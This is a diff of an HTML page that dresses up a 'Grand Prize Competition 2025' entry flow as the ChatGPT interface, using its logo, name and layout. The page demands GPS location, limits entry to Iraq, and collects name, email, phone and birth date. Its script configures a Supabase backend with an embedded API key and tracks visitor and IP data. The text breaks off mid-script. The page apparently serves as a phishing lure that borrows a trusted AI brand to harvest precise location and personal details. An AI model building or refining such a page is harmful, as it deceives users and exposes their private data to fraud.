@@ -1,302 +1,1065 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>AI Assistant</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Grand Prize Competition 2025</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Söhne:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
+    :root {
+      --bg:           #212121;
+      --bg-sidebar:   #171717;
+      --bg-card:      #2f2f2f;
+      --bg-input:     #2f2f2f;
+      --bg-hover:     #3a3a3a;
+      --accent:       #10a37f;
+      --accent-hover: #0d8c6d;
+      --text:         #ececec;
+      --text-sub:     #b4b4b4;
+      --muted:        #8e8ea0;
+      --border:       #444444;
+      --error:        #ef4444;
+      --success:      #10a37f;
+      --font:         'Söhne', 'ui-sans-serif', 'system-ui', -apple-system, sans-serif;
+    }
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
+    html, body {
+      min-height: 100vh;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      font-size: 16px;
+      line-height: 1.6;
+    }
 
-body{
-  font-family:Inter,sans-serif;
-  background:#343541;
-  color:#ECECF1;
-  height:100vh;
-  display:flex;
-}
+    /* ── Sidebar ── */
+    .sidebar {
+      position: fixed;
+      top: 0; left: 0;
+      width: 260px; height: 100vh;
+      background: var(--bg-sidebar);
+      display: flex;
+      flex-direction: column;
+      padding: 12px 8px;
+      z-index: 10;
+      border-right: 1px solid rgba(255,255,255,0.05);
+    }
+    .sidebar-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 12px;
+      margin-bottom: 8px;
+    }
+    .sidebar-logo svg {
+      width: 28px; height: 28px;
+      flex-shrink: 0;
+    }
+    .sidebar-logo-text {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text);
+    }
+    .sidebar-new-chat {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 500;
+      transition: background 0.15s;
+      border: 1px solid rgba(255,255,255,0.1);
+      margin-bottom: 16px;
+    }
+    .sidebar-new-chat:hover { background: var(--bg-hover); }
+    .sidebar-new-chat svg { width: 16px; height: 16px; opacity: 0.7; }
+    .sidebar-section {
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--muted);
+      padding: 0 12px;
+      margin-bottom: 6px;
+    }
+    .sidebar-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      color: var(--text-sub);
+      font-size: 13.5px;
+      transition: background 0.15s;
+      overflow: hidden;
+    }
+    .sidebar-item:hover { background: var(--bg-hover); color: var(--text); }
+    .sidebar-item svg { width: 15px; height: 15px; flex-shrink: 0; opacity: 0.6; }
+    .sidebar-item span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .sidebar-spacer { flex: 1; }
+    .sidebar-footer {
+      padding: 8px 12px;
+      border-top: 1px solid rgba(255,255,255,0.06);
+      margin-top: 8px;
+    }
+    .sidebar-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .sidebar-user:hover { background: var(--bg-hover); }
+    .sidebar-avatar {
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      background: var(--accent);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; font-weight: 600; color: #fff;
+      flex-shrink: 0;
+    }
+    .sidebar-username { font-size: 13.5px; color: var(--text); font-weight: 500; }
+    .sidebar-plan { font-size: 11px; color: var(--muted); }
 
-/* Sidebar */
-.sidebar{
-  width:260px;
-  background:#202123;
-  padding:16px;
-  display:flex;
-  flex-direction:column;
-}
-.logo{
-  font-weight:600;
-  font-size:14px;
-  margin-bottom:20px;
-}
+    /* ── Main area ── */
+    .main {
+      margin-left: 260px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
 
-/* Main */
-.main{
-  flex:1;
-  display:flex;
-  flex-direction:column;
-}
+    /* ── Top bar ── */
+    .topbar {
+      width: 100%;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 20px;
+      position: sticky;
+      top: 0;
+      z-index: 5;
+      background: var(--bg);
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+    }
+    .topbar-model {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text);
+      cursor: pointer;
+      padding: 4px 10px;
+      border-radius: 6px;
+      transition: background 0.15s;
+    }
+    .topbar-model:hover { background: var(--bg-card); }
+    .topbar-model svg { width: 14px; height: 14px; opacity: 0.6; }
 
-/* Top bar */
-.topbar{
-  padding:14px;
-  border-bottom:1px solid #565869;
-  display:flex;
-  justify-content:center;
-}
-.model{
-  background:#40414F;
-  padding:8px 12px;
-  border-radius:8px;
-  font-size:13px;
-}
+    /* ── Screens ── */
+    .screen {
+      display: none;
+      width: 100%;
+      flex: 1;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 0.35s ease;
+    }
+    .screen.active { display: flex; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-/* Chat */
-.chat{
-  flex:1;
-  overflow-y:auto;
-  padding:30px 20px;
-}
+    /* ── Loading ── */
+    #screen-loading {
+      position: fixed; inset: 0; z-index: 200;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: var(--bg);
+      transition: opacity 0.4s ease;
+    }
+    .loader-ring {
+      width: 44px; height: 44px;
+      border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.1);
+      border-top-color: var(--accent);
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text {
+      margin-top: 16px;
+      font-size: 13px;
+      color: var(--muted);
+    }
 
-/* Message blocks */
-.msg{
-  max-width:700px;
-  margin:0 auto 24px;
-  display:flex;
-  gap:12px;
-}
-.avatar{
-  width:28px;height:28px;border-radius:4px;
-  background:#19c37d;
-  display:flex;align-items:center;justify-content:center;
-  font-size:14px;color:#000;
-}
-.bubble{
-  background:#444654;
-  padding:14px 16px;
-  border-radius:8px;
-  line-height:1.6;
-}
+    /* ── Chat welcome (GPS screen) ── */
+    #screen-gps {
+      justify-content: center;
+      padding: 60px 20px 160px;
+    }
+    .welcome-heading {
+      font-size: clamp(26px, 4vw, 36px);
+      font-weight: 600;
+      color: var(--text);
+      text-align: center;
+      margin-bottom: 40px;
+      line-height: 1.2;
+    }
+    .suggestions-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      width: 100%;
+      max-width: 640px;
+    }
+    .suggestion-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px;
+      cursor: default;
+      transition: background 0.15s;
+    }
+    .suggestion-card-title {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+    .suggestion-card-sub {
+      font-size: 12.5px;
+      color: var(--muted);
+    }
+    .gps-status-bar {
+      position: fixed;
+      bottom: 90px;
+      left: 50%;
+      transform: translateX(-50%) translateX(130px);
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 18px;
+      font-size: 13px;
+      color: var(--text-sub);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      white-space: nowrap;
+      z-index: 20;
+    }
+    .gps-status-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--accent);
+      animation: pulse 1.5s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%       { opacity: 0.4; transform: scale(0.8); }
+    }
+    .gps-status-dot.denied  { background: var(--error); animation: none; }
+    .gps-status-dot.success { background: var(--success); animation: none; }
 
-/* Input bar */
-.inputbar{
-  border-top:1px solid #565869;
-  padding:14px;
-}
-.inputinner{
-  max-width:700px;
-  margin:auto;
-  background:#40414F;
-  border-radius:10px;
-  padding:12px;
-}
-input{
-  width:100%;
-  background:transparent;
-  border:none;
-  color:#fff;
-  outline:none;
-  font-size:15px;
-}
+    /* ── Retry button (shown after failure) ── */
+    .retry-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-sub);
+      cursor: pointer;
+      transition: background 0.15s, color 0.15s;
+      margin-left: 10px;
+    }
+    .retry-btn:hover { background: var(--bg-hover); color: var(--text); }
 
-/* Screens */
-.screen{display:none;}
-.screen.active{display:block;}
+    /* ── Input bar (decorative, always visible) ── */
+    .input-wrapper {
+      position: fixed;
+      bottom: 0; left: 260px; right: 0;
+      padding: 16px 20px 24px;
+      background: linear-gradient(to top, var(--bg) 70%, transparent);
+      display: flex;
+      justify-content: center;
+      z-index: 10;
+    }
+    .input-bar {
+      width: 100%;
+      max-width: 680px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: flex-end;
+      gap: 10px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.3);
+    }
+    .input-textarea {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      resize: none;
+      font-family: var(--font);
+      font-size: 15px;
+      color: var(--text);
+      line-height: 1.5;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .input-textarea::placeholder { color: var(--muted); }
+    .input-send {
+      width: 36px; height: 36px;
+      border-radius: 8px;
+      background: var(--accent);
+      border: none;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      transition: background 0.15s;
+    }
+    .input-send:hover { background: var(--accent-hover); }
+    .input-send svg { width: 16px; height: 16px; fill: #fff; }
+    .input-disclaimer {
+      text-align: center;
+      font-size: 11.5px;
+      color: var(--muted);
+      margin-top: 10px;
+    }
 
-button{
-  margin-top:14px;
-  padding:10px 14px;
-  border:none;
-  border-radius:6px;
-  background:#19c37d;
-  font-weight:600;
-  cursor:pointer;
-}
-</style>
+    /* ── Blocked / Access Denied ── */
+    #screen-blocked {
+      justify-content: center;
+      align-items: center;
+      padding: 60px 20px;
+    }
+    .denied-container {
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+    }
+    .denied-code {
+      font-size: clamp(72px, 12vw, 120px);
+      font-weight: 700;
+      color: rgba(255,255,255,0.06);
+      line-height: 1;
+      margin-bottom: 8px;
+      letter-spacing: -4px;
+    }
+    .denied-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 12px;
+    }
+    .denied-message {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.75;
+      margin-bottom: 28px;
+    }
+    .denied-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(239,68,68,0.1);
+      border: 1px solid rgba(239,68,68,0.25);
+      border-radius: 8px;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: #f87171;
+    }
+
+    /* ── Form screen ── */
+    #screen-form {
+      padding: 40px 20px 160px;
+      align-items: center;
+    }
+    .chat-message-bot {
+      width: 100%;
+      max-width: 680px;
+      display: flex;
+      gap: 16px;
+      margin-bottom: 28px;
+      padding: 0 4px;
+    }
+    .bot-avatar {
+      width: 30px; height: 30px;
+      border-radius: 50%;
+      background: var(--accent);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .bot-avatar svg { width: 16px; height: 16px; fill: #fff; }
+    .bot-text {
+      flex: 1;
+      font-size: 15px;
+      color: var(--text);
+      line-height: 1.7;
+    }
+    .form-card {
+      width: 100%;
+      max-width: 680px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 28px;
+    }
+    .form-row { margin-bottom: 18px; }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 7px;
+    }
+    input[type=text], input[type=email], input[type=tel], input[type=date] {
+      width: 100%;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px 14px;
+      font-family: var(--font);
+      font-size: 15px;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.2s;
+      -webkit-appearance: none;
+    }
+    input:focus { border-color: var(--accent); }
+    input.err { border-color: var(--error); }
+    input::placeholder { color: rgba(255,255,255,0.15); }
+    .field-err { font-size: 12px; color: var(--error); margin-top: 5px; min-height: 16px; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+    .alert {
+      padding: 12px 14px;
+      border-radius: 10px;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+    .alert-err  { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.25);  color: #fca5a5; }
+    .alert-warn { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.25); color: #fcd34d; }
+    .alert-ok   { background: rgba(16,163,127,0.1); border: 1px solid rgba(16,163,127,0.25); color: #6ee7b7; }
+    .btn {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 13px 20px;
+      border: none; border-radius: 10px; cursor: pointer;
+      font-family: var(--font); font-size: 15px; font-weight: 500;
+      transition: all 0.2s ease;
+    }
+    .btn-accent {
+      background: var(--accent);
+      color: #fff;
+    }
+    .btn-accent:hover:not(:disabled) { background: var(--accent-hover); }
+    .btn-accent:disabled { opacity: 0.4; cursor: not-allowed; }
+    .form-footer-note {
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.7;
+      margin-top: 14px;
+      text-align: center;
+    }
+
+    /* ── Success screen ── */
+    #screen-success {
+      justify-content: center;
+      align-items: center;
+      padding: 60px 20px;
+    }
+    .success-container {
+      max-width: 520px;
+      width: 100%;
+    }
+    .success-message {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 32px;
+    }
+    .success-check {
+      width: 48px; height: 48px;
+      border-radius: 50%;
+      background: rgba(16,163,127,0.15);
+      border: 1px solid rgba(16,163,127,0.3);
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 20px;
+    }
+    .success-check svg { width: 22px; height: 22px; stroke: var(--accent); fill: none; stroke-width: 2.5; }
+    .success-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 10px;
+    }
+    .success-body {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.75;
+      margin-bottom: 22px;
+    }
+    .ref-box {
+      display: inline-block;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 20px;
+      font-family: monospace;
+      font-size: 14px;
+      letter-spacing: 0.12em;
+      color: var(--accent);
+    }
+
+    /* ── Mobile ── */
+    @media (max-width: 768px) {
+      .sidebar { display: none; }
+      .main { margin-left: 0; }
+      .input-wrapper { left: 0; }
+      .gps-status-bar { transform: translateX(-50%); }
+      .suggestions-grid { grid-template-columns: 1fr; }
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="sidebar">
-  <div class="logo">🤖 AI Assistant</div>
-</div>
+<!-- ─────────────── SIDEBAR ─────────────── -->
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <svg viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.079 10.079 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.269-2.942 10.078 10.078 0 0 0-9.68 6.986 9.967 9.967 0 0 0-6.569 4.242 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.269 2.941 10.079 10.079 0 0 0 9.68-6.985 9.967 9.967 0 0 0 6.569-4.243 10.079 10.079 0 0 0-1.24-11.816zm-17.276 24.263a7.459 7.459 0 0 1-4.782-1.74l.239-.136 7.844-4.527a.772.772 0 0 0 .389-.678v-11.06l3.316 1.914a.071.071 0 0 1 .039.053v9.123a7.507 7.507 0 0 1-7.045 5.051zm-15.606-6.870a7.495 7.495 0 0 1-.894-5.023l.239.144 7.843 4.527a.772.772 0 0 0 .777 0l9.592-5.538v3.828a.07.07 0 0 1-.028.061l-7.926 4.579a7.505 7.505 0 0 1-9.603-2.578zm-2.207-17.468a7.476 7.476 0 0 1 3.908-3.297l-.001.275v9.053a.77.77 0 0 0 .389.677l9.592 5.538-3.316 1.914a.07.07 0 0 1-.068.006L8.009 27.864a7.504 7.504 0 0 1-3.566-10.099zm27.309 6.445l-9.592-5.538 3.316-1.914a.07.07 0 0 1 .068-.006l7.922 4.574a7.504 7.504 0 0 1-1.162 13.528v-9.328a.771.771 0 0 0-.552-.316zm3.297-5.035-.239-.145-7.843-4.527a.772.772 0 0 0-.777 0L14.666 23.6v-3.828a.07.07 0 0 1 .028-.061l7.926-4.579a7.505 7.505 0 0 1 11.186 7.771zm-20.549 6.758l-3.316-1.914a.07.07 0 0 1-.039-.053v-9.123a7.504 7.504 0 0 1 12.305-5.756l-.239.136-7.844 4.527a.771.771 0 0 0-.389.678l-.478 11.505zm1.801-3.887l4.267-2.461 4.268 2.461v4.923l-4.268 2.461-4.267-2.461v-4.923z" fill="currentColor"/>
+    </svg>
+    <span class="sidebar-logo-text">ChatGPT</span>
+  </div>
 
-<div class="main">
+  <div class="sidebar-new-chat">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 5v14M5 12h14"/>
+    </svg>
+    New chat
+  </div>
 
-<div class="topbar">
-  <div class="model">Model ▾ GPT-4 Style</div>
-</div>
+  <div class="sidebar-section">Today</div>
+  <div class="sidebar-item">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>Grand Prize Competition 2025</span>
+  </div>
+  <div class="sidebar-item">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>Eligibility Requirements</span>
+  </div>
+  <div class="sidebar-item">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>How to Enter</span>
+  </div>
 
-<div class="chat">
+  <div class="sidebar-section" style="margin-top:16px">Yesterday</div>
+  <div class="sidebar-item">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>Prize Details &amp; Rules</span>
+  </div>
+  <div class="sidebar-item">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>Participant FAQ</span>
+  </div>
 
-<!-- GPS -->
-<div id="screen-gps" class="screen active">
-  <div class="msg">
-    <div class="avatar">AI</div>
-    <div class="bubble">
-      To continue, I need to verify your location.<br><br>
-      Please allow location access.<br><br>
-      <div id="gps-alert"></div>
-      <button id="btn-gps">Allow Location</button>
+  <div class="sidebar-spacer"></div>
+
+  <div class="sidebar-footer">
+    <div class="sidebar-user">
+      <div class="sidebar-avatar">G</div>
+      <div>
+        <div class="sidebar-username">Guest User</div>
+        <div class="sidebar-plan">Free plan</div>
+      </div>
     </div>
   </div>
-</div>
+</aside>
 
-<!-- BLOCKED -->
-<div id="screen-blocked" class="screen">
-  <div class="msg">
-    <div class="avatar">AI</div>
-    <div class="bubble">
-      ❌ This competition is only available in Iraq.
+<!-- ─────────────── MAIN ─────────────── -->
+<main class="main">
+  <div class="topbar">
+    <div class="topbar-model">
+      ChatGPT
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
     </div>
   </div>
-</div>
 
-<!-- FORM -->
-<div id="screen-form" class="screen">
-  <div class="msg">
-    <div class="avatar">AI</div>
-    <div class="bubble">
-      You're eligible. Enter your details below:
-      <br><br>
+  <!-- ─── LOADING ─── -->
+  <div id="screen-loading">
+    <div class="loader-ring"></div>
+    <p class="loader-text">Loading…</p>
+  </div>
 
-      <input id="f-name" placeholder="Full Name"><br><br>
-      <input id="f-email" placeholder="Email"><br><br>
-      <input id="f-phone" placeholder="Phone"><br><br>
-      <input id="f-dob" type="date"><br><br>
+  <!-- ─── GPS / WELCOME SCREEN ─── -->
+  <div id="screen-gps" class="screen">
+    <p class="welcome-heading">How can I help you today?</p>
+    <div class="suggestions-grid">
+      <div class="suggestion-card">
+        <div class="suggestion-card-title">Check my eligibility</div>
+        <div class="suggestion-card-sub">Find out if you qualify to enter</div>
+      </div>
+      <div class="suggestion-card">
+        <div class="suggestion-card-title">What are the prizes?</div>
+        <div class="suggestion-card-sub">View the full prize breakdown</div>
+      </div>
+      <div class="suggestion-card">
+        <div class="suggestion-card-title">How does it work?</div>
+        <div class="suggestion-card-sub">Step-by-step entry guide</div>
+      </div>
+      <div class="suggestion-card">
+        <div class="suggestion-card-title">Competition rules</div>
+        <div class="suggestion-card-sub">Read the terms and conditions</div>
+      </div>
+    </div>
 
+    <!-- Status pill shown during / after GPS check -->
+    <div class="gps-status-bar" id="gps-status-bar" style="display:none">
+      <div class="gps-status-dot" id="gps-status-dot"></div>
+      <span id="gps-status-text">Verifying your location…</span>
+      <button class="retry-btn" id="gps-retry-btn" style="display:none" onclick="retryGps()">Try again</button>
+    </div>
+  </div>
+
+  <!-- ─── BLOCKED / ACCESS DENIED ─── -->
+  <div id="screen-blocked" class="screen">
+    <div class="denied-container">
+      <div class="denied-code">403</div>
+      <div class="denied-title">Access Denied</div>
+      <div class="denied-message">
+        Location access is required to verify your eligibility for this competition.
+        Without location permission we cannot confirm you are a resident of Iraq,
+        and your entry cannot be accepted.
+      </div>
+      <div class="denied-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        403 Forbidden — Location permission denied
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── FORM SCREEN ─── -->
+  <div id="screen-form" class="screen">
+    <div class="chat-message-bot">
+      <div class="bot-avatar">
+        <svg viewBox="0 0 41 41" xmlns="http://www.w3.org/2000/svg"><path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.079 10.079 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.269-2.942 10.078 10.078 0 0 0-9.68 6.986 9.967 9.967 0 0 0-6.569 4.242 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.269 2.941 10.079 10.079 0 0 0 9.68-6.985 9.967 9.967 0 0 0 6.569-4.243 10.079 10.079 0 0 0-1.24-11.816z" fill="white"/></svg>
+      </div>
+      <div class="bot-text">
+        Your location has been verified. You are eligible to enter the Grand Prize Competition 2025.
+        Please complete the form below to submit your entry.
+      </div>
+    </div>
+
+    <div class="form-card">
       <div id="form-alert"></div>
 
-      <button id="btn-submit" onclick="submitForm()">Submit</button>
+      <div class="form-row">
+        <label for="f-name">Full Name</label>
+        <input type="text"  id="f-name"  placeholder="Ahmad Mohammed Al-…" autocomplete="name" />
+        <div class="field-err" id="e-name"></div>
+      </div>
+
+      <div class="form-row">
+        <label for="f-email">Email Address</label>
+        <input type="email" id="f-email" placeholder="your@email.com" autocomplete="email" />
+        <div class="field-err" id="e-email"></div>
+      </div>
+
+      <div class="form-row">
+        <label for="f-phone">Phone Number</label>
+        <input type="tel"   id="f-phone" placeholder="+964 7XX XXX XXXX" autocomplete="tel" />
+        <div class="field-err" id="e-phone"></div>
+      </div>
+
+      <div class="form-row">
+        <label for="f-dob">Date of Birth</label>
+        <input type="date"  id="f-dob" autocomplete="bday" />
+        <div class="field-err" id="e-dob"></div>
+      </div>
+
+      <hr />
+
+      <p style="font-size:13px; color:var(--muted); margin-bottom:18px; line-height:1.7">
+        By entering you confirm all information is accurate and that you are
+        a resident of Iraq. Providing false information will result in
+        disqualification and a new winner will be selected.
+      </p>
+
+      <button class="btn btn-accent" id="btn-submit" onclick="submitForm()">
+        Enter the Competition
+      </button>
+
+      <p class="form-footer-note">All entries are confidential · One entry per person</p>
     </div>
   </div>
-</div>
 
-<!-- SUCCESS -->
-<div id="screen-success" class="screen">
-  <div class="msg">
-    <div class="avatar">AI</div>
-    <div class="bubble">
-      ✅ You're in!<br><br>
-      <div id="entry-ref"></div>
+  <!-- ─── SUCCESS SCREEN ─── -->
+  <div id="screen-success" class="screen">
+    <div class="success-container">
+      <div class="success-message">
+        <div class="success-check">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="success-title">You're In!</div>
+        <div class="success-body">
+          Your entry has been recorded for the Grand Prize Competition 2025.
+          The winner will be announced soon — good luck!
+        </div>
+        <div class="ref-box" id="entry-ref">Entry confirmed</div>
+        <p style="font-size:12px; color:var(--muted); margin-top:14px">
+          Screenshot this page and keep your reference number.
+        </p>
+      </div>
     </div>
   </div>
-</div>
+</main>
 
-</div>
-
-<div class="inputbar">
-  <div class="inputinner">
-    <input placeholder="Send a message..." disabled />
+<!-- ─────────────── INPUT BAR (decorative) ─────────────── -->
+<div class="input-wrapper">
+  <div>
+    <div class="input-bar">
+      <textarea class="input-textarea" rows="1" placeholder="Message ChatGPT" id="chat-input"></textarea>
+      <button class="input-send" onclick="handleChatInput()">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+      </button>
+    </div>
+    <div class="input-disclaimer">ChatGPT can make mistakes. Consider checking important information.</div>
   </div>
 </div>
 
-</div>
-
+<!-- ─────────────── SCRIPT (logic unchanged) ─────────────── -->
 <script>
-// CONFIG
-const SUPABASE_URL='https://jutxirqoqtmvbpvkwumf.supabase.co';
-const SUPABASE_ANON_KEY='YOUR_KEY';
+// ══════════════════════════════════════════════════
+//  CONFIG  ← unchanged
+// ══════════════════════════════════════════════════
+const SUPABASE_URL      = 'https://jutxirqoqtmvbpvkwumf.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp1dHhpcnFvcXRtdmJwdmt3dW1mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc3MTk5OTEsImV4cCI6MjA5MzI5NTk5MX0.3gnuccG9AxrPoz3ks0gqvx3loU4eP6NYlLhlYQutymg';
 
-const IRAQ={latMin:29.0,latMax:37.5,lngMin:38.6,lngMax:48.9};
+const IRAQ = { latMin:29.0, latMax:37.5, lngMin:38.6, lngMax:48.9 };
 
-const sb=window.supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
+const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+let visitorId   = null;
+let ipData      = {};
+let gpsPosition = null;
 
-let visitorId=null;
-let ipData={};
-let gpsPosition=null;
-
-// UI
-function show(id){
-  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-  document.getElementById('screen-'+id).classList.add('active');
+// ══════════════════════════════════════════════════
+//  UTILITIES  ← unchanged
+// ══════════════════════════════════════════════════
+function show(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-' + id)?.classList.add('active');
 }
 
-// CHECK
-function isIraq(lat,lng){
-  return lat>=IRAQ.latMin && lat<=IRAQ.latMax &&
